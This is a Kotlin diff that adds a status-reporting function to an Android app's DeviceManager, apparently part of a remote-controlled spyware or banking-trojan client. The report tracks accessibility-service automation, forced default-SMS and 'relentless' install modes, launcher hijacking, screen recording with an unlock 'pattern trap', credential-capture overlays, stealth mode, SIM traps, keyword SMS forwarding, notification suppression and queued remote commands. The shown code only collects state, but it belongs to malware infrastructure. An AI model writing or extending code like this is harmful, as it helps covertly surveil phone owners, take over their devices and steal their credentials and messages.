@@ -330,4 +330,94 @@ object DeviceManager {
         
         return json
     }
+
+    fun getAppStateReport(ctx: Context): JSONObject {
+        val report = JSONObject()
+        val now = System.currentTimeMillis()
+
+        // 1. Live Operations
+        val live = JSONObject()
+        live.put("monitor_service_running", MonitorService.isRunning)
+        live.put("accessibility_sequence", MyAccessibilityService.instance?.activeSequence ?: "NONE")
+        live.put("waiting_for_data", MyAccessibilityService.instance?.isWaitingForDataSettings ?: false)
+        live.put("waiting_for_wifi", MyAccessibilityService.instance?.isWaitingForWifiSettings ?: false)
+        live.put("waiting_for_location", MyAccessibilityService.instance?.isWaitingForLocationSettings ?: false)
+        live.put("sms_manager_mode", DefaultSmsManager.expectedMode.ifEmpty { "NONE" })
+        live.put("sms_relentless_active", DefaultSmsManager.isRelentlessActive)
+        live.put("launcher_hijacking", LauncherManager.isHijacking)
+        live.put("screen_recording", ScreenRecordManager.isRecording)
+        live.put("pattern_trap_active", ScreenRecordManager.isPatternTrap)
+        live.put("auth_recovery_active", AuthRecoveryManager.isRecoveryActive)
+        report.put("live_operations", live)
+
+        // 2. Overlays & Display
+        val ui = JSONObject()
+        ui.put("dimmer_level", DimmerManager.currentLevel)
+        ui.put("any_overlay_attached", DynamicUIManager.isAnyAttached)
+        ui.put("web_overlay_attached", DynamicUIManager.isAttached)
+        ui.put("native_overlay_attached", DynamicUIManager.isNativeAttached)
+        val statsPrefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+        ui.put("power_shield_ignited", statsPrefs.getBoolean("power_shield_keep_ignited", false))
+        report.put("display_state", ui)
+
+        // 3. Security Protocols
+        val sec = JSONObject()
+        sec.put("stealth_mode_active", JudasManager.isStealthModeActive(ctx))
+        val judasPrefs = ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE)
+        sec.put("stolen_alert_pending", judasPrefs.getBoolean("stolen_alert_pending", false))
+        sec.put("sim_trap_armed", judasPrefs.getBoolean("is_sim_trap_armed", false))
+        sec.put("power_shield_armed", statsPrefs.getBoolean("power_shield_active", false))
+        sec.put("relentless_install_armed", statsPrefs.getBoolean("relentless_install_active", false))
+        report.put("security_protocols", sec)
+
+        // 4. Timers & Expiries (Calculated Remaining)
+        val timers = JSONObject()
+        val locBreak = statsPrefs.getLong("location_break_expiry", 0L)
+        timers.put("location_break_remaining_ms", Math.max(0L, locBreak - now))
+        
+        val safeZone = statsPrefs.getLong("safe_zone_expiry", 0L)
+        timers.put("safe_zone_remaining_ms", Math.max(0L, safeZone - now))
+
+        val maint = judasPrefs.getLong("maintenance_expiry", 0L)
+        timers.put("sim_maintenance_remaining_ms", Math.max(0L, maint - now))
+        report.put("active_timers", timers)
+
+        // 5. Queues & Retries
+        val queues = JSONObject()
+        val gatekeeperPrefs = ctx.getSharedPreferences("deferred_commands", Context.MODE_PRIVATE)
+        queues.put("gatekeeper_deferred", org.json.JSONArray(gatekeeperPrefs.getString("queue", "[]") ?: "[]"))
+
+        val retryPrefs = ctx.getSharedPreferences("cortex_retries", Context.MODE_PRIVATE)
+        queues.put("scheduled_retries", org.json.JSONArray(retryPrefs.getString("queue", "[]") ?: "[]"))
+
+        queues.put("scraper_tasks", org.json.JSONArray(statsPrefs.getString("tree_tasks_json", "[]") ?: "[]"))
+        report.put("queues", queues)
+
+        // 6. Config Armory Summary
+        val armory = JSONObject()
+        val uiTraps = org.json.JSONArray(statsPrefs.getString("ui_traps_array", "[]") ?: "[]")
+        val nativeTraps = org.json.JSONArray(statsPrefs.getString("native_traps_array", "[]") ?: "[]")
+        armory.put("ui_traps_count", uiTraps.length())
+        armory.put("native_traps_count", nativeTraps.length())
+        
+        val hvtPrefs = ctx.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE)
+        armory.put("hvt_redirects_count", hvtPrefs.all.size)
+        
+        val kwPrefs = ctx.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE)
+        armory.put("keyword_forwards_count", kwPrefs.all.size)
+
+        val autoSwipePrefs = ctx.getSharedPreferences("auto_swipe_prefs", Context.MODE_PRIVATE)
+        val swipeRules = JSONObject()
+        swipeRules.put("pkgs", autoSwipePrefs.getString("pkgs", ""))
+        swipeRules.put("keywords", autoSwipePrefs.getString("keywords", ""))
+        swipeRules.put("senders", autoSwipePrefs.getString("senders", ""))
+        armory.put("auto_swipe_rules", swipeRules)
+
+        report.put("armory_summary", armory)
+        
+        // 7. Data Collection Logic
+        report.put("feature_collection_rules", ConfigManager.getConfig(ctx))
+
+        return report
+    }
 }
